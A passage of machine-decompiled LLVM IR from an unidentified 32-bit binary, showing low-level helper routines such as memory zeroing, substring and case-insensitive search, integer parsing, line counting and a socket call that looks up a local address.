  call void @__pseudo_cond_branch(i1 %v2_12514, i32 %v0_12518)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12520

dec_label_pc_12520:                               ; preds = %dec_label_pc_12520, %dec_label_pc_12514
  %v2_12524 = phi i32 [ %v1_12528, %dec_label_pc_12520 ], [ 0, %dec_label_pc_12514 ]
  store i32 0, i32* @r3, align 4
  %v4_12524 = add i32 %v2_12524, %arg1
  %v5_12524 = inttoptr i32 %v4_12524 to i8*
  store i8 0, i8* %v5_12524, align 1
  %v0_12528 = load i32, i32* %r2.global-to-local, align 4
  %v1_12528 = add i32 %v0_12528, 1
  store i32 %v1_12528, i32* %r2.global-to-local, align 4
  %v9_1252c = icmp eq i32 %v1_12528, %arg2
  br i1 %v9_1252c, label %dec_label_pc_12534, label %dec_label_pc_12520

dec_label_pc_12534:                               ; preds = %dec_label_pc_12520
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12528, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12538(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12538:
  store i32 %arg4, i32* @r3, align 4
  %v7_1254c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1254c, label %dec_label_pc_12554, label %dec_label_pc_1255c

dec_label_pc_12554:                               ; preds = %dec_label_pc_12570, %dec_label_pc_1255c, %dec_label_pc_12538, %dec_label_pc_1259c
  %storemerge = phi i32 [ %v1_1259c, %dec_label_pc_1259c ], [ -1, %dec_label_pc_12538 ], [ -1, %dec_label_pc_1255c ], [ -1, %dec_label_pc_12570 ]
  ret i32 %storemerge

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12538
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_12554, label %dec_label_pc_12564

dec_label_pc_12564:                               ; preds = %dec_label_pc_1255c
  br label %dec_label_pc_1257c

dec_label_pc_12570:                               ; preds = %bb, %dec_label_pc_12590
  %v1_1257c3 = phi i32 [ %v1_12590, %dec_label_pc_12590 ], [ 0, %bb ]
  %v1_12570 = add i32 %v0_1259c, 1
  %v9_12574 = icmp eq i32 %v1_12570, %arg2
  br i1 %v9_12574, label %dec_label_pc_12554, label %dec_label_pc_1257c

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12570, %dec_label_pc_12564
  %v0_1259c = phi i32 [ %v1_12570, %dec_label_pc_12570 ], [ 0, %dec_label_pc_12564 ]
  %v1_1257c = phi i32 [ %v1_1257c3, %dec_label_pc_12570 ], [ 0, %dec_label_pc_12564 ]
  %v2_1257c = add i32 %v1_1257c, %arg3
  %v3_1257c = inttoptr i32 %v2_1257c to i8*
  %v4_1257c = load i8, i8* %v3_1257c, align 1
  %v2_12580 = add i32 %v0_1259c, %arg1
  %v3_12580 = inttoptr i32 %v2_12580 to i8*
  %v4_12580 = load i8, i8* %v3_12580, align 1
  %v6_12580 = zext i8 %v4_12580 to i32
  store i32 %v6_12580, i32* @r3, align 4
  %v9_12584 = icmp eq i8 %v4_12580, %v4_1257c
  br i1 %v9_12584, label %dec_label_pc_12590, label %bb

bb:                                               ; preds = %dec_label_pc_1257c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12570

dec_label_pc_12590:                               ; preds = %dec_label_pc_1257c
  %v1_12590 = add i32 %v1_1257c, 1
  store i32 %v1_12590, i32* @ip, align 4
  %v9_12594 = icmp eq i32 %v1_12590, %arg4
  br i1 %v9_12594, label %dec_label_pc_1259c, label %dec_label_pc_12570

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12590
  %v1_1259c = add i32 %v0_1259c, 1
  br label %dec_label_pc_12554

; uselistorder directives
  uselistorder i32 %v1_12590, { 1, 2, 0 }
  uselistorder i32 %v1_1257c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12570, { 1, 0 }
  uselistorder label %dec_label_pc_12554, { 3, 0, 1, 2 }
}

define i32 @function_125a4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_125a4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_125a4 = load i32, i32* @r4, align 4
  %v12_125a4 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_125b4

dec_label_pc_125b4:                               ; preds = %.thread, %dec_label_pc_125c8, %bb, %dec_label_pc_125a4
  %v0_125b4 = phi i32 [ %tmp, %dec_label_pc_125a4 ], [ %v5_125b4, %bb ], [ %v5_125b4, %dec_label_pc_125c8 ], [ %v5_125b4, %.thread ]
  %v1_125b4 = inttoptr i32 %v0_125b4 to i8*
  %v2_125b4 = load i8, i8* %v1_125b4, align 1
  %v5_125b4 = add i32 %v0_125b4, 1
  store i32 %v5_125b4, i32* %r5.global-to-local, align 4
  %v7_125b8 = icmp eq i8 %v2_125b4, 9
  br i1 %v7_125b8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_125b4
  br label %dec_label_pc_125b4

bb:                                               ; preds = %dec_label_pc_125b4
  %v3_125b4 = zext i8 %v2_125b4 to i32
  %v8_125bc = icmp eq i8 %v2_125b4, 32
  store i32 %v3_125b4, i32* @r4, align 4
  br i1 %v8_125bc, label %dec_label_pc_125b4, label %dec_label_pc_125c8

dec_label_pc_125c8:                               ; preds = %bb
  %v7_125c8 = icmp eq i8 %v2_125b4, 10
  br i1 %v7_125c8, label %dec_label_pc_125b4, label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125c8
  %v7_125d0 = icmp eq i8 %v2_125b4, 45
  br i1 %v7_125d0, label %dec_label_pc_126c0, label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125d0
  %v7_125d8 = icmp eq i8 %v2_125b4, 43
  br i1 %v7_125d8, label %bb44, label %dec_label_pc_125e8

bb44:                                             ; preds = %dec_label_pc_125d8
  %v2_125dc = inttoptr i32 %v5_125b4 to i8*
  %v3_125dc = load i8, i8* %v2_125dc, align 1
  %v4_125dc = zext i8 %v3_125dc to i32
  store i32 %v4_125dc, i32* @r4, align 4
  %v6_125dc = add i32 %v0_125b4, 2
  store i32 %v6_125dc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %bb44, %dec_label_pc_125d8, %dec_label_pc_126c0
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_126c0 ], [ 2147483647, %dec_label_pc_125d8 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_126c0 ], [ 0, %dec_label_pc_125d8 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_125f0 = call i32 @function_12b6c(i32 %storemerge1, i32 %arg2)
  %v0_125f4 = load i32, i32* @r7, align 4
  store i32 %v0_125f4, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_125fc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_125fc, i32* @r1, align 4
  %v0_12600 = call i32 @function_12a70()
  store i32 0, i32* @ip, align 4
  %v0_12610.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12610.outer

dec_label_pc_12610.outer:                         ; preds = %.thread5, %dec_label_pc_125e8
  %v2_1268c.ph = phi i32 [ %v5_1268c, %.thread5 ], [ 0, %dec_label_pc_125e8 ]
  %v1_12650.ph = phi i32 [ %v4_12690, %.thread5 ], [ %v0_12610.pre, %dec_label_pc_125e8 ]
  %v1_12668.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_125e8 ]
  %v3_1265c = icmp uge i32 %v2_1268c.ph, %v0_12600
  %v9_1265c = icmp eq i32 %v2_1268c.ph, %v0_12600
  %v2_12660 = xor i1 %v3_1265c, true
  %v3_12660 = or i1 %v9_1265c, %v2_12660
  %v2_12664 = xor i1 %v9_1265c, true
  %v3_12664 = and i1 %v3_1265c, %v2_12664
  %v2_12684 = icmp eq i1 %v9_1265c, false
  br label %dec_label_pc_12610

dec_label_pc_12610:                               ; preds = %dec_label_pc_12610.outer, %dec_label_pc_12698
  %v1_12668 = phi i32 [ -1, %dec_label_pc_12698 ], [ %v1_12668.ph, %dec_label_pc_12610.outer ]
  %v1_12650 = phi i32 [ %v3_12698, %dec_label_pc_12698 ], [ %v1_12650.ph, %dec_label_pc_12610.outer ]
  %v1_12610 = urem i32 %v1_12650, 256
  %v1_12614 = add nsw i32 %v1_12610, -48
  %v1_1261c = add nsw i32 %v1_12610, -97
  %v1_12620 = add i32 %v1_12650, -48
  %v1_12624 = add nsw i32 %v1_12610, -65
  %tmp75 = icmp ult i32 %v1_12614, 10
  br i1 %tmp75, label %dec_label_pc_12654, label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %dec_label_pc_12610
  %v2_1262c = icmp ugt i32 %v1_12624, 24
  %v7_1262c = icmp eq i32 %v1_12624, 25
  %v2_12630 = xor i1 %v7_1262c, true
  %v3_12630 = and i1 %v2_1262c, %v2_12630
  br i1 %v3_12630, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1262c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1262c, %bb45
  %v0_1264414 = phi i32 [ %v1_12620, %dec_label_pc_1262c ], [ 0, %bb45 ]
  %v2_12634 = xor i1 %v2_1262c, true
  %v3_12634 = or i1 %v7_1262c, %v2_12634
  br i1 %v3_12634, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_12644 = phi i32 [ %v0_1264414, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_12630, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_1263c = icmp ugt i32 %v1_1261c, 24
  %v11_1263c = icmp eq i32 %v1_1261c, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_12640 = phi i1 [ %v7_1262c, %bb48 ], [ %v11_1263c, %bb49 ]
  %v0_12640 = phi i1 [ %v2_1262c, %bb48 ], [ %v6_1263c, %bb49 ]
  %v2_12640 = xor i1 %v1_12640, true
  %v3_12640 = and i1 %v0_12640, %v2_12640
  br i1 %v3_12640, label %dec_label_pc_126a4, label %dec_label_pc_12644

dec_label_pc_12644:                               ; preds = %bb50
  %v2_12644 = icmp eq i32 %v0_12644, 0
  %. = select i1 %v2_12644, i32 87, i32 55
  %v2_12650 = sub i32 %v1_12650, %.
  br label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %dec_label_pc_12610, %dec_label_pc_12644
  %v0_1266829 = phi i32 [ %v1_12624, %dec_label_pc_12610 ], [ %., %dec_label_pc_12644 ]
  %v3_1268c = phi i32 [ %v1_12620, %dec_label_pc_12610 ], [ %v2_12650, %dec_label_pc_12644 ]
  %v1_12654 = load i32, i32* %r6.global-to-local, align 4
  %v2_12654 = sub i32 %v3_1268c, %v1_12654
  %v4_12654 = xor i32 %v1_12654, %v3_1268c
  %v5_12654 = xor i32 %v2_12654, %v3_1268c
  %v6_12654 = and i32 %v5_12654, %v4_12654
  %v7_12654 = icmp slt i32 %v6_12654, 0
  %v8_12654 = icmp slt i32 %v2_12654, 0
  %v2_12658 = xor i1 %v8_12654, %v7_12654
  br i1 %v2_12658, label %dec_label_pc_1265c, label %dec_label_pc_126a4

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12654
  br i1 %v3_12660, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_1265c
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_1265c, %bb53
  %v0_1266828 = phi i32 [ %v0_1266829, %dec_label_pc_1265c ], [ 0, %bb53 ]
  br i1 %v3_12664, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_12668 = phi i32 [ %v0_1266828, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_12668, 0
  %v4_12668 = zext i1 %tmp76 to i32
  %v5_12668 = or i32 %v0_12668, %v4_12668
  %v7_12668 = icmp eq i32 %v5_12668, 0
  br i1 %v7_12668, label %dec_label_pc_12670, label %dec_label_pc_12698

dec_label_pc_12670:                               ; preds = %bb56
  %v1_1267c = load i32, i32* %r8.global-to-local, align 4
  %v2_1267c = sub i32 %v3_1268c, %v1_1267c
  %v4_1267c = xor i32 %v1_1267c, %v3_1268c
  %v5_1267c = xor i32 %v2_1267c, %v3_1268c
  %v6_1267c = and i32 %v5_1267c, %v4_1267c
  %v7_1267c = icmp slt i32 %v6_1267c, 0
  %v8_1267c = icmp slt i32 %v2_1267c, 0
  %v9_1267c = icmp eq i32 %v3_1268c, %v1_1267c
  %v3_12680 = xor i1 %v8_1267c, %v7_1267c
  %v4_12680 = or i1 %v9_1267c, %v3_12680
  br i1 %v4_12680, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12670
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_12670
  store i32 1, i32* @ip, align 4
  br i1 %v2_12684, label %.thread5, label %dec_label_pc_12698

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1268c = mul i32 %v1_12654, %v2_1268c.ph
  %v5_1268c = add i32 %v4_1268c, %v3_1268c
  %v1_12690 = load i32, i32* %r5.global-to-local, align 4
  %v2_12690 = inttoptr i32 %v1_12690 to i8*
  %v3_12690 = load i8, i8* %v2_12690, align 1
  %v4_12690 = zext i8 %v3_12690 to i32
  %v6_12690 = add i32 %v1_12690, 1
  store i32 %v6_12690, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12610.outer

dec_label_pc_12698:                               ; preds = %thread-pre-split, %bb56
  %v0_12698 = load i32, i32* %r5.global-to-local, align 4
  %v1_12698 = inttoptr i32 %v0_12698 to i8*
  %v2_12698 = load i8, i8* %v1_12698, align 1
  %v3_12698 = zext i8 %v2_12698 to i32
  %v5_12698 = add i32 %v0_12698, 1
  store i32 %v5_12698, i32* %r5.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_12610

dec_label_pc_126a4:                               ; preds = %dec_label_pc_12654, %bb50
  %v1_126a4 = icmp slt i32 %v1_12668, 0
  %v0_126d0 = load i32, i32* %sl.global-to-local, align 4
  %v2_126d0 = icmp eq i32 %v0_126d0, 0
  br i1 %v1_126a4, label %dec_label_pc_126d0, label %dec_label_pc_126ac

dec_label_pc_126ac:                               ; preds = %dec_label_pc_126a4
  br i1 %v2_126d0, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_126ac
  %v2_126b0 = sub i32 0, %v2_1268c.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_126ac, %bb59
  %v1_126bc = phi i32 [ -2147483648, %bb61 ], [ %v2_1268c.ph, %dec_label_pc_126ac ], [ %v2_126b0, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_125a4, i32* @r4, align 4
  store i32 %v12_125a4, i32* @r7, align 4
  ret i32 %v1_126bc

dec_label_pc_126c0:                               ; preds = %dec_label_pc_125d0
  %v1_126c0 = inttoptr i32 %v5_125b4 to i8*
  %v2_126c0 = load i8, i8* %v1_126c0, align 1
  %v3_126c0 = zext i8 %v2_126c0 to i32
  store i32 %v3_126c0, i32* @r4, align 4
  %v5_126c0 = add i32 %v0_125b4, 2
  store i32 %v5_126c0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_126d0:                               ; preds = %dec_label_pc_126a4
  br i1 %v2_126d0, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_126d0
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_126d0
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_126d0, { 1, 0 }
  uselistorder i32 %v2_1267c, { 1, 0 }
  uselistorder i32 %v1_1267c, { 1, 0, 2 }
  uselistorder i32 %v2_12654, { 1, 0 }
  uselistorder i32 %v3_1268c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1262c, { 1, 2, 0 }
  uselistorder i1 %v2_1262c, { 1, 0, 2 }
  uselistorder i32 %v1_12610, { 1, 2, 0 }
  uselistorder i32 %v1_12650, { 1, 2, 0 }
  uselistorder i32 %v1_12668, { 1, 0 }
  uselistorder i1 %v9_1265c, { 1, 0, 2 }
  uselistorder i1 %v3_1265c, { 1, 0 }
  uselistorder i32 %v2_1268c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_12600, { 1, 0 }
  uselistorder i32 %v5_125b4, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_125b4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_125b4, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 20, 21, 2, 11, 3, 12, 4, 13, 5, 14, 10, 0, 15, 6, 16, 1, 17, 7, 8, 18, 9, 19, 22 }
  uselistorder i8 32, { 8, 9, 10, 0, 11, 12, 13, 1, 2, 3, 4, 5, 6, 7, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i8 9, { 5, 0, 1, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_12654, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_12610, { 1, 0 }
  uselistorder label %dec_label_pc_125e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125b4, { 1, 2, 0, 3 }
}

define i32 @function_126e0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_126e0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_126e0 = load i32, i32* @r4, align 4
  store i32 %v3_126e0, i32* %stack_var_-24, align 4
  %v12_126e0 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_126f8

dec_label_pc_126f8:                               ; preds = %dec_label_pc_1271c.dec_label_pc_126f8_crit_edge, %dec_label_pc_126e0
  %v0_126fc = phi i32 [ %v0_126fc.pre, %dec_label_pc_1271c.dec_label_pc_126f8_crit_edge ], [ %arg3, %dec_label_pc_126e0 ]
  %v1_12704 = call i32 @function_12ee4(i32 %v0_126fc)
  %v7_12708 = icmp eq i32 %v1_12704, 1
  %v0_12710 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_12708, label %dec_label_pc_12710, label %dec_label_pc_12728

dec_label_pc_12710:                               ; preds = %dec_label_pc_126f8
  %v1_12710 = add i32 %v0_12710, 1
  store i32 %v1_12710, i32* %r5.global-to-local, align 4
  %v1_12714 = load i32, i32* %r8.global-to-local, align 4
  %v6_12718 = icmp slt i32 %v1_12710, %v1_12714
  br i1 %v6_12718, label %dec_label_pc_1271c, label %.loopexit

dec_label_pc_1271c:                               ; preds = %dec_label_pc_12710
  %v0_1271c = load i32, i32* %r4.global-to-local, align 4
  %v1_1271c = inttoptr i32 %v0_1271c to i8*
  %v2_1271c = load i8, i8* %v1_1271c, align 1
  %v5_1271c = add i32 %v0_1271c, 1
  store i32 %v5_1271c, i32* %r4.global-to-local, align 4
  %v7_12720 = icmp eq i8 %v2_1271c, 10
  br i1 %v7_12720, label %dec_label_pc_12728, label %dec_label_pc_1271c.dec_label_pc_126f8_crit_edge

dec_label_pc_1271c.dec_label_pc_126f8_crit_edge:  ; preds = %dec_label_pc_1271c
  %v0_126fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_126f8

dec_label_pc_12728:                               ; preds = %dec_label_pc_126f8, %dec_label_pc_1271c
  %v0_12728 = phi i32 [ %v1_12710, %dec_label_pc_1271c ], [ %v0_12710, %dec_label_pc_126f8 ]
  %v2_12728 = icmp eq i32 %v0_12728, 0
  br i1 %v2_12728, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_12728
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_12710, %dec_label_pc_12728, %bb
  %v0_12730 = load i32, i32* @r7, align 4
  %v2_12734 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12734, i32* @r4, align 4
  store i32 %v12_126e0, i32* @r7, align 4
  ret i32 %v0_12730

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12728, { 1, 0 }
}

define i32 @function_1273c() local_unnamed_addr {
dec_label_pc_1273c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1274c = call i32 @function_13574()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_12754 = inttoptr i32 %v0_1274c to i32*
  store i32 0, i32* %v2_12754, align 4
  %v0_12760 = load i32, i32* %r4.global-to-local, align 4
  %v3_12764 = call i32 @function_13940(i32 2, i32 2, i32 %v0_12760)
  %v7_12768 = icmp eq i32 %v3_12764, -1
  store i32 %v3_12764, i32* %r5.global-to-local, align 4
  br i1 %v7_12768, label %bb, label %dec_label_pc_12778

bb:                                               ; preds = %dec_label_pc_1273c
  %v1_12770 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_127c4

dec_label_pc_12778:                               ; preds = %dec_label_pc_1273c
  %v2_12784 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12784, i32* %r4.global-to-local, align 4
  %v0_12790 = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_127a4 = call i32 @function_13728(i32 %v3_12764, i32 %v2_12784, i32 %v0_12790)
  %v2_127ac = ptrtoint i32* %stack_var_-20 to i32
  %v0_127b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_127b4 = call i32 @function_13760(i32 %v0_127b0, i32 %v2_12784, i32 %v2_127ac)
  %v1_127bc = call i32 @function_1314c(i32 %v0_127b0)
  br label %dec_label_pc_127c4

dec_label_pc_127c4:                               ; preds = %bb, %dec_label_pc_12778
  %storemerge = phi i32 [ 134744072, %dec_label_pc_12778 ], [ %v1_12770, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_12764, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13728, { 1, 7, 2, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13940, { 2, 19, 3, 4, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_127c4, { 1, 0 }
}

define i32 @function_127d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_127d0:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_127d4 = load i8, i8* %tmp, align 1
  %v2_127d8 = icmp eq i8 %v3_127d4, 0
  br i1 %v2_127d8, label %bb, label %dec_label_pc_127ec

bb:                                               ; preds = %dec_label_pc_127d0
  %v4_127d4 = zext i8 %v3_127d4 to i32
  br label %dec_label_pc_12800

dec_label_pc_127ec:                               ; preds = %dec_label_pc_127d0
  br label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127ec
  %v0_127f0 = phi i32 [ %v1_127f0, %dec_label_pc_127f0 ], [ 0, %dec_label_pc_127ec ]
  %v1_127f0 = add i32 %v0_127f0, 1
  %v2_127f4 = add i32 %v1_127f0, %arg2
  %v3_127f4 = inttoptr i32 %v2_127f4 to i8*
  %v4_127f4 = load i8, i8* %v3_127f4, align 1
  %v2_127f8 = icmp eq i8 %v4_127f4, 0
  br i1 %v2_127f8, label %dec_label_pc_12800, label %dec_label_pc_127f0

dec_label_pc_12800:                               ; preds = %dec_label_pc_127f0, %bb
  %v0_1284421 = phi i32 [ %v4_127d4, %bb ], [ %v1_127f0, %dec_label_pc_127f0 ]
  %v0_128082 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_128082, 1
  br i1 %tmp29, label %dec_label_pc_12858, label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_12800, %dec_label_pc_12808.backedge
  %v0_1280c.in = phi i32 [ %v0_1280c, %dec_label_pc_12808.backedge ], [ %v0_128082, %dec_label_pc_12800 ]
  %v1_12820 = phi i32 [ %v1_1282015, %dec_label_pc_12808.backedge ], [ 0, %dec_label_pc_12800 ]
  %v0_12814 = phi i32 [ %v5_12814, %dec_label_pc_12808.backedge ], [ %tmp23, %dec_label_pc_12800 ]
  %v0_1280c = add i32 %v0_1280c.in, -1
  %v1_12814 = inttoptr i32 %v0_12814 to i8*
  %v2_12814 = load i8, i8* %v1_12814, align 1
  %v3_12814 = zext i8 %v2_12814 to i32
  store i32 %v3_12814, i32* @ip, align 4
  %v5_12814 = add i32 %v0_12814, 1
  %v1_12818 = add nsw i32 %v3_12814, -65
  %v2_12820 = add i32 %v1_12820, %arg2
  %v3_12820 = inttoptr i32 %v2_12820 to i8*
  %v4_12820 = load i8, i8* %v3_12820, align 1
  %v6_12820 = zext i8 %v4_12820 to i32
  %v1_12824 = add nsw i32 %v6_12820, -65
  %tmp38 = icmp ult i32 %v1_12818, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_12814
  %v5_12828 = or i32 %v3_12814, 96
  store i32 %v5_12828, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_12814, %bb30
  %v0_12834 = phi i32 [ %v3_12814, %dec_label_pc_12814 ], [ %v5_12828, %bb30 ]
  %tmp39 = icmp ult i32 %v1_12824, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_12830 = or i32 %v6_12820, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_12834 = phi i32 [ %v6_12820, %bb31 ], [ %v5_12830, %bb32 ]
  %v9_12834 = icmp eq i32 %v0_12834, %v1_12834
  br i1 %v9_12834, label %dec_label_pc_12840, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_12808.backedge

dec_label_pc_12808.backedge:                      ; preds = %bb34, %dec_label_pc_12840
  %v1_1282015 = phi i32 [ 0, %bb34 ], [ %v1_12840, %dec_label_pc_12840 ]
  %tmp35 = icmp slt i32 %v0_1280c, 1
  br i1 %tmp35, label %dec_label_pc_12858, label %dec_label_pc_12814

dec_label_pc_12840:                               ; preds = %bb33
  %v1_12840 = add i32 %v1_12820, 1
  %v9_12844 = icmp eq i32 %v0_1284421, %v1_12840
  br i1 %v9_12844, label %dec_label_pc_1284c, label %dec_label_pc_12808.backedge

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12840
  %v2_1284c = sub i32 %v5_12814, %tmp23
  br label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %dec_label_pc_12808.backedge, %dec_label_pc_12800, %dec_label_pc_1284c
  %storemerge = phi i32 [ %v2_1284c, %dec_label_pc_1284c ], [ -1, %dec_label_pc_12800 ], [ -1, %dec_label_pc_12808.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12840, { 1, 0 }
  uselistorder i32 %v0_12814, { 1, 0 }
  uselistorder i32 %v1_12820, { 1, 0 }
  uselistorder i8 %v3_127d4, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_12858, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12808.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_12814, { 1, 0 }
}

define i32 @function_12860(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12860:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12860 = load i8, i8* %arg1, align 1
  %v2_12864 = icmp eq i8 %v2_12860, 0
  br i1 %v2_12864, label %bb, label %dec_label_pc_12870

bb:                                               ; preds = %dec_label_pc_12860
  %v3_12860 = zext i8 %v2_12860 to i32
  br label %dec_label_pc_12884

dec_label_pc_12870:                               ; preds = %dec_label_pc_12860
  br label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %dec_label_pc_12874, %dec_label_pc_12870
  %v0_12874 = phi i32 [ %v1_12874, %dec_label_pc_12874 ], [ 0, %dec_label_pc_12870 ]
